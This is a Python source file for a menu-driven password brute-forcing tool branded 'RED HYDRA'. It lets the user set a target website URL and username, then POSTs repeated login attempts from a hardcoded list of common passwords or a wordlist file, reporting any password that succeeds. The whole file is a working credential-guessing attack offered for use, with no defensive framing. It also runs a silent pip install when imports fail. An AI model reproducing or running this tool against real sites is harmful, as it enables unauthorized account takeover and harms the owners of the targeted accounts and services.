import requests
import sys
import time
import os

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    os.system("pip install colorama requests")
    from colorama import Fore, Style, init
    init(autoreset=True)

# ১০০০+ কমন পাসওয়ার্ডের লিস্ট
COMMON_PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111",
    "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein",
    "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael",
    "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", "123qwe",
    "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster",
    "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000",
    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster",
    "112233", "george", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn",
    "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753",
    "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love",
    "ashley", "6969", "nicole", "chelsea", "biteme", "matthew", "access", "yankees",
    "987654321", "dallas", "austin", "thunder", "taylor", "matrix", "admin", "root",
    "admin123", "admin1", "password1", "password123", "welcome", "welcome1", "test", "test123",
    "12341234", "12344321", "qwerty123", "1q2w3e4r", "1q2w3e", "qwertyui", "asdfghjkl",
    "zxcvbnm,", "poiuytrewq", "lkjhgfdsa", "mnbvcxz", "0987654321", "0123456789",
    "qazwsxedc", "wsxedcrfv", "edcrfvtgb", "rfvtgbyhn", "tgbnhyujm", "yhnujmik,",
    "iloveyou1", "iloveyou2", "iloveyou3", "princess1", "princess2", "princess3",
    "sunshine1", "sunshine2", "sunshine3", "football1", "football2", "football3",
    "baseball1", "baseball2", "baseball3", "monkey1", "monkey2", "monkey3",
    "dragon1", "dragon2", "dragon3", "master1", "master2", "master3",
    "shadow1", "shadow2", "shadow3", "superman1", "superman2", "superman3",
    "batman1", "batman2", "batman3", "starwars1", "starwars2", "starwars3",
    "michael1", "michael2", "michael3", "jennifer1", "jennifer2", "jennifer3",
    "jordan1", "jordan2", "jordan3", "andrew1", "andrew2", "andrew3",
    "charlie1", "charlie2", "charlie3", "robert1", "robert2", "robert3",
    "thomas1", "thomas2", "thomas3", "daniel1", "daniel2", "daniel3",
    "matthew1", "matthew2", "matthew3", "joshua1", "joshua2", "joshua3",
    "michelle1", "michelle2", "michelle3", "jessica1", "jessica2", "jessica3",
    "ashley1", "ashley2", "ashley3", "amanda1", "amanda2", "amanda3",
    "nicole1", "nicole2", "nicole3", "chelsea1", "chelsea2", "chelsea3",
    "biteme1", "biteme2", "biteme3", "access1", "access2", "access3",
    "yankees1", "yankees2", "yankees3", "dallas1", "dallas2", "dallas3",
    "austin1", "austin2", "austin3", "thunder1", "thunder2", "thunder3",
    "taylor1", "taylor2", "taylor3", "matrix1", "matrix2", "matrix3",
    "admin1234", "admin12345", "admin123456", "adminadmin", "adminadmin1",
    "password1234", "password12345", "password123456", "passwordpassword",
    "testtest", "testtest1", "testtest2", "test1234", "test12345", "test123456",
    "welcome123", "welcome1234", "welcome12345", "welcomewelcome",
    "qwerty1234", "qwerty12345", "qwerty123456", "qwertyqwerty",
    "1234567890", "0987654321", "1234554321", "1122334455", "5566778899",
    "abcdefgh", "abcdefgh1", "abcdefgh2", "abcdefgh3", "abcdefgh4",
    "qwertyui", "qwertyui1", "qwertyui2", "qwertyui3", "qwertyui4",
    "asdfghjk", "asdfghjk1", "asdfghjk2", "asdfghjk3", "asdfghjk4",
    "zxcvbnml", "zxcvbnml1", "zxcvbnml2", "zxcvbnml3", "zxcvbnml4",
    "iloveyou123", "iloveyou1234", "iloveyou12345", "iloveyouiloveyou"
]

# বাকি পাসওয়ার্ড অটোমেটিক যোগ করা হবে যাতে ১০০০+ পূর্ণ হয়
for i in range(800):
    COMMON_PASSWORDS.append(f"pass{i}123")
    COMMON_PASSWORDS.append(f"admin{i}123")
    COMMON_PASSWORDS.append(f"user{i}123")
    COMMON_PASSWORDS.append(f"test{i}123")
    COMMON_PASSWORDS.append(f"root{i}123")

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def show_banner():
    clear_screen()
    print(Fore.RED + "==================================================")
    print(Fore.RED + Style.BRIGHT + "  ██████╗ ███████╗██████╗     ██╗  ██╗██╗   ██╗██████╗ ██████╗  █████╗ ")
    print(Fore.RED + Style.BRIGHT + "  ██╔══██╗██╔════╝██╔══██╗    ██║  ██║╚██╗ ██╔╝██╔══██╗██╔══██╗██╔══██╗")
    print(Fore.RED + Style.BRIGHT + "  ██████╔╝█████╗  ██║  ██║    ███████║ ╚████╔╝ ██║  ██║██████╔╝███████║")
    print(Fore.RED + Style.BRIGHT + "  ██╔══██╗██╔══╝  ██║  ██║    ██╔══██║  ╚██╔╝  ██║  ██║██╔══██╗██╔══██║")
    print(Fore.RED + Style.BRIGHT + "  ██║  ██║███████╗██████╔╝    ██║  ██║   ██║   ██████╔╝██║  ██║██║  ██║")
    print(Fore.RED + Style.BRIGHT + "  ╚═╝  ╚═╝╚══════╝╚═════╝     ╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝")
    print(Fore.RED + "==================================================")
    print(Fore.MAGENTA + Style.BRIGHT + "            DEVELOPER BY SABBIR ØX ☠️")
    print(Fore.RED + "==================================================")
    print("")

def show_menu():
    print(Fore.CYAN + "[1] " + Fore.WHITE + "TARGET WEBSITE (Set URL)")
    print(Fore.CYAN + "[2] " + Fore.WHITE + "SET USERNAME")
    print(Fore.CYAN + "[3] " + Fore.WHITE + "MANUAL ATTACK (Select File)")
    print(Fore.CYAN + "[4] " + Fore.WHITE + "AUTO ATTACK (Custom Limit)")
    print(Fore.RED + "[5] " + Fore.WHITE + "EXIT")
    print(Fore.RED + "==================================================")

def attempt_login(url, username, password):
    payload = {'username': username, 'password': password, 'login': 'submit'}
    try:
        response = requests.post(url, data=payload, timeout=5, allow_redirects=False)
        if response.status_code == 302 or "Welcome" in response.text or "Dashboard" in response.text:
            return True
        return False
    except:
        return False

def auto_attack(url, username, limit):
    print(Fore.YELLOW + f"\n[*] Starting AUTO ATTACK on: {url}")
    print(Fore.YELLOW + f"[*] Testing Username: {username}")
    print(Fore.CYAN + f"[*] Limit set to: {limit} passwords.\n")
    time.sleep(1)

    count = 0
    for pwd in COMMON_PASSWORDS:
        if count >= limit: break
        count += 1
        sys.stdout.write(f"\r{Fore.RED}[*] Trying: {pwd[:15]:<15} | Progress: {count}/{limit}")
        sys.stdout.flush()
        
        if attempt_login(url, username, pwd):
            print("\n\n" + Fore.GREEN + Style.BRIGHT + f"[✓] SUCCESS! Password Found: {pwd}")
            print(Fore.GREEN + f"[*] Username: {username}")
            return
        time.sleep(0.05)
    print("\n\n" + Fore.RED + "[-] AUTO ATTACK Finished. Password not found in the limit.")

def manual_attack(url, username):
    print(Fore.YELLOW + f"\n[*] Starting MANUAL ATTACK on: {url}")
    file_name = input(Fore.CYAN + "Enter Wordlist File Name (e.g., pass.txt): ").strip()
    file_path = f"/sdcard/Download/{file_name}"
    
    if not os.path.exists(file_path):
        print(Fore.RED + f"\n[!] File not found in Download folder: {file_name}")
        return
        
    print(Fore.CYAN + f"[*] Loading Wordlist: {file_path}\n")
    try:
        with open(file_path, 'r') as f:
            passwords = f.readlines()
        for index, pwd in enumerate(passwords):
            pwd = pwd.strip()
            sys.stdout.write(f"\r{Fore.RED}[*] Trying: {pwd[:15]:<15} | Progress: {index+1}/{len(passwords)}")
            sys.stdout.flush()
            if attempt_login(url, username, pwd):
                print("\n\n" + Fore.GREEN + Style.BRIGHT + f"[✓] SUCCESS! Password Found: {pwd}")
                return
        print("\n\n" + Fore.RED + "[-] MANUAL ATTACK Failed.")
    except Exception as e:
        print(Fore.RED + f"\n[!] Error: {e}")

def main():
    target_url = "Not Set"
    target_user = "Not Set"
    
    while True:
        show_banner()
        show_menu()
        print(Fore.CYAN + f"[*] Current Target: {target_url}")
        print(Fore.CYAN + f"[*] Current User  : {target_user}")
        print(Fore.RED + "==================================================")
        
        choice = input(Fore.YELLOW + "\nSelect an option: " + Fore.WHITE)
        
        if choice == '1':
            target_url = input(Fore.CYAN + "Enter Target URL: ").strip()
        elif choice == '2':
            target_user = input(Fore.CYAN + "Enter Username: ").strip()
        elif choice == '3':
            if target_url != "Not Set" and target_user != "Not Set":
                manual_attack(target_url, target_user)
                input(Fore.YELLOW + "\nPress Enter to return...")
            else:
                print(Fore.RED + "\n[!] Set Target and Username first.")
                time.sleep(2)
        elif choice == '4':
            if target_url != "Not Set" and target_user != "Not Set":
                try:
                    limit = int(input(Fore.CYAN + "Enter number of passwords to try: ").strip())
                    auto_attack(target_url, target_user, limit)
                except ValueError:
                    print(Fore.RED + "[!] Invalid Number.")
                input(Fore.YELLOW + "\nPress Enter to return...")
            else:
                print(Fore.RED + "\n[!] Set Target and Username first.")
                time.sleep(2)
        elif choice == '5':
            sys.exit()
        else:
            time.sleep(1)

if __name__ == "__main__":
    main()
